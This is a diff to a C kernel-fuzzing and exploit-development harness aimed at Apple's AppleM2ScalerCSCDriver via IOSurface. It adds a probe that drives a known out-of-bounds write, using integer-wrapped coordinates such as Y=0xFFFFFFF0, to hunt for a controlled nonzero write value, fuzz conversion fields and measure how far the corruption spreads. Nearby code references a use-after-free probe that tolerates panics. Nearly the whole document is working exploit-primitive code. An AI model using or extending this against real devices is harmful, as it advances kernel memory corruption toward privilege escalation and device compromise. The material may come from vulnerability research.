@@ -16178,6 +16178,163 @@ static void p_xywrap(void) {
     LOG("[xyw] done (alive)");
 }
 
+// V101: hunt for a nonzero/controlled border-fill value. Working write path
+// (v100): Y=0xFFFFFFF0, H=0x20 into a 64MB dst. Steps (FUZZ_VALHUNT_STEP):
+// 0 = pixel formats without alpha (premultiply can't zero);
+// 1 = CSC-field hunt (offset walk with 1.0f/2.0f/fixed values, value oracle);
+// 2 = span control (W/H wrap variants, corruption extent).
+static kern_return_t valhunt_shot(io_connect_t c, uint8_t *req, IOSurfaceID si, IOSurfaceID di,
+                                  uint32_t X, uint32_t Y, uint32_t W, uint32_t H) {
+    border_payload(req, si, di, X, Y, W, H, 32, 32);
+    return scaler_call1(c, req);
+}
+// returns first-corrupt-window info: *bad qwords differing from page markers in
+// [0, win), and copies first 8 bytes of the first bad page.
+static long valhunt_scan(IOSurfaceRef gd, size_t win, uint8_t *fb) {
+    long bad = 0;
+    if (IOSurfaceLock(gd, kIOSurfaceLockReadOnly, NULL)) return -1;
+    uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(gd);
+    size_t total = (size_t)IOSurfaceGetAllocSize(gd);
+    if (win > total) win = total;
+    int got = 0;
+    for (size_t p = 0; p + 0x1000 <= win; p += 0x1000) {
+        for (size_t i = p; i < p + 0x1000; i += 4)
+            if (*(uint32_t *)(base + i) != (0x01010101u * ((p >> 12) & 0xff))) {
+                if (!got) { memcpy(fb, base + p, 8); got = 1; }
+                bad++;
+            }
+    }
+    IOSurfaceUnlock(gd, kIOSurfaceLockReadOnly, NULL);
+    return bad;
+}
+static void valhunt_mark(IOSurfaceRef gd, size_t win) {
+    if (IOSurfaceLock(gd, 0, NULL)) return;
+    uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(gd);
+    size_t total = (size_t)IOSurfaceGetAllocSize(gd);
+    if (win > total) win = total;
+    for (size_t p = 0; p + 0x1000 <= win; p += 0x1000)
+        memset(base + p, (int)((p >> 12) & 0xff), 0x1000);
+    IOSurfaceUnlock(gd, 0, NULL);
+}
+
+static void p_valhunt(void) {
+    int step = atoi(getenv("FUZZ_VALHUNT_STEP") ?: "0");
+    LOG("[valh] v101 step %d", step);
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) return;
+    uint8_t *req = must_map(0x1000);
+    const size_t WIN = 0x100000;   // scan/mark window (baseline span 0x4b000)
+    uint8_t fb[8];
+
+    if (step == 0) {
+        // formats without alpha
+        static const struct { uint32_t fourcc; int bpe; const char *n; } fmts[] = {
+            { 0x42475241, 4, "BGRA (ctrl)" },
+            { 0x32345247, 3, "24RGB" },
+            { 0x32344247, 3, "24BGR" },
+            { 0x4c303038, 1, "L008" },
+            { 0x32433038, 1, "2C08" },
+            { 0x36345241, 8, "64RA" },
+            { 0x62363461, 8, "b64a" },
+            { 0x4c303068, 2, "L00h" },
+            { 0x34323076, 1, "420v" },
+            { 0x34323066, 1, "420f" },
+        };
+        for (unsigned fi = 0; fi < sizeof(fmts)/sizeof(fmts[0]); fi++) {
+            IOSurfaceRef gs = make_surface_fmt(64, 64, fmts[fi].bpe, fmts[fi].fourcc);
+            IOSurfaceRef gd = make_surface_fmt(4096, 4096, fmts[fi].bpe, fmts[fi].fourcc);
+            if (!gs || !gd) { LOG("[valh] fmt %s: surface fail", fmts[fi].n); continue; }
+            IOSurfaceID gsi = IOSurfaceGetID(gs), gdi = IOSurfaceGetID(gd);
+            craft_transform(req, gsi, gdi, 64, 64);
+            kern_return_t kw = scaler_call1(c, req);
+            usleep(1000000);
+            valhunt_mark(gd, WIN);
+            // no-shot control
+            uint8_t fb0[8] = {0};
+            long bad0 = valhunt_scan(gd, WIN, fb0);
+            kern_return_t kr = -1;
+            long bad = -1;
+            if (!bad0) {
+                LOG("[valh] fmt %s: shot...", fmts[fi].n);
+                kr = valhunt_shot(c, req, gsi, gdi, 32, 0xFFFFFFF0, 0xFFFFFFE0, 0x20);
+                usleep(100000);
+                bad = valhunt_scan(gd, WIN, fb);
+            }
+            LOG("[valh] fmt %-12s wire 0x%08x | ctrl bad %ld | shot kr 0x%08x bad %ld first %02x %02x %02x %02x %02x %02x %02x %02x",
+                fmts[fi].n, kw, bad0, kr, bad,
+                fb[0], fb[1], fb[2], fb[3], fb[4], fb[5], fb[6], fb[7]);
+            CFRelease(gs); CFRelease(gd);
+        }
+    } else if (step == 1) {
+        // CSC-field hunt: mutate one dword per shot, watch the written value
+        IOSurfaceRef gs = make_surface(64, 64);
+        IOSurfaceRef gd = make_surface(4096, 4096);
+        if (!gs || !gd) return;
+        IOSurfaceID gsi = IOSurfaceGetID(gs), gdi = IOSurfaceGetID(gd);
+        craft_transform(req, gsi, gdi, 64, 64);
+        LOG("[valh] wire -> kr 0x%08x", scaler_call1(c, req));
+        usleep(1000000);
+        static const uint32_t vals[] = { 0x3f800000, 0x40000000, 0x00010000, 0xffffffff };
+        long cskip = atol(getenv("FUZZ_VALHUNT_SKIP") ?: "0");
+        long cc = 0;
+        for (long off = 0; off < 0x1b0; off += 4) {
+            for (unsigned vi = 0; vi < 4; vi++) {
+                cc++;
+                if (cc <= cskip) continue;
+                LOG("[valh] csc #%ld off 0x%03lx val 0x%08x ...", cc, off, vals[vi]);
+                valhunt_mark(gd, WIN);
+                craft_transform(req, gsi, gdi, 64, 64);
+                *(uint32_t *)(req + off) = vals[vi];
+                kern_return_t kr = valhunt_shot(c, req, gsi, gdi, 32, 0xFFFFFFF0, 0xFFFFFFE0, 0x20);
+                long bad = valhunt_scan(gd, WIN, fb);
+                // baseline: bad ~19448 qwords(?) of 0x00. Report anomalies:
+                // nonzero written value, changed extent, or different kr.
+                int nonzero = fb[0] || fb[1] || fb[2] || fb[3] || fb[4] || fb[5] || fb[6] || fb[7];
+                if (nonzero || kr != 0xe00002d6 || bad == 0)
+                    LOG("[valh] csc off 0x%03lx val 0x%08x -> kr 0x%08x bad %ld first %02x %02x %02x %02x %02x %02x %02x %02x %s",
+                        off, vals[vi], kr, bad,
+                        fb[0], fb[1], fb[2], fb[3], fb[4], fb[5], fb[6], fb[7],
+                        nonzero ? "*** NONZERO VALUE ***" : (bad == 0 ? "(no write)" : ""));
+                usleep(2000);
+            }
+            if ((off & 0x3f) == 0) LOG("[valh] csc progress off 0x%lx alive", off);
+        }
+    } else if (step == 2) {
+        // span control: wrap-conserving W/H variants around the working point
+        IOSurfaceRef gs = make_surface(64, 64);
+        IOSurfaceRef gd = make_surface(4096, 4096);
+        if (!gs || !gd) return;
+        IOSurfaceID gsi = IOSurfaceGetID(gs), gdi = IOSurfaceGetID(gd);
+        craft_transform(req, gsi, gdi, 64, 64);
+        LOG("[valh] wire -> kr 0x%08x", scaler_call1(c, req));
+        usleep(1000000);
+        static const struct { uint32_t X, Y, W, H; const char *n; } spans[] = {
+            { 32, 0xFFFFFFF0, 0xFFFFFFE0, 0x20, "baseline" },
+            { 32, 0xFFFFFFF0, 0xFFFFFFE0, 0x10, "H 0x10" },
+            { 32, 0xFFFFFFF0, 0xFFFFFFE0, 0x40, "H 0x40" },
+            { 32, 0xFFFFFFF0, 0xFFFFFFE0, 0x100, "H 0x100" },
+            { 0x10 - 0x10, 0xFFFFFFF0, 0x10, 0x20, "W 0x10 X wrap" },   // X=0x00000000
+            { 0xFFFFFFF0, 0xFFFFFFF0, 0x20, 0x20, "W 0x20 X wrap" },
+            { 0xFFFFFFD0, 0xFFFFFFF0, 0x40, 0x20, "W 0x40 X wrap" },
+            { 0xFFFFFF90, 0xFFFFFFF0, 0x80, 0x20, "W 0x80 X wrap" },
+            { 32, 0xFFFFFFF0, 0xFFFFFFF0, 0x20, "W fffffff0" },
+            { 32, 0xFFFFFFF0, 0xFFFFFFC0, 0x20, "W ffffffc0" },
+        };
+        for (unsigned si2 = 0; si2 < sizeof(spans)/sizeof(spans[0]); si2++) {
+            valhunt_mark(gd, WIN);
+            LOG("[valh] span %s: X %08x Y %08x W %08x H %08x shot", spans[si2].n,
+                spans[si2].X, spans[si2].Y, spans[si2].W, spans[si2].H);
+            kern_return_t kr = valhunt_shot(c, req, gsi, gdi, spans[si2].X, spans[si2].Y,
+                                            spans[si2].W, spans[si2].H);
+            usleep(100000);
+            long bad = valhunt_scan(gd, WIN, fb);
+            LOG("[valh] span %-14s -> kr 0x%08x bad qwords %ld (extent ~0x%zx) first %02x %02x %02x %02x",
+                spans[si2].n, kr, bad, bad * 4, fb[0], fb[1], fb[2], fb[3]);
+        }
+    }
+    LOG("[valh] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -16308,6 +16465,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_VALHUNT")) { p_valhunt(); LOG("[probe13] valhunt-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XYWRAP")) { p_xywrap(); LOG("[probe13] xywrap-only mode, stop"); return NULL; }
         if (getenv("FUZZ_SCALERFUZZ")) { p_scalerfuzz(); LOG("[probe13] scalerfuzz-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DEEPPROBE")) { p_deepprobe(); LOG("[probe13] deepprobe-only mode, stop"); return NULL; }
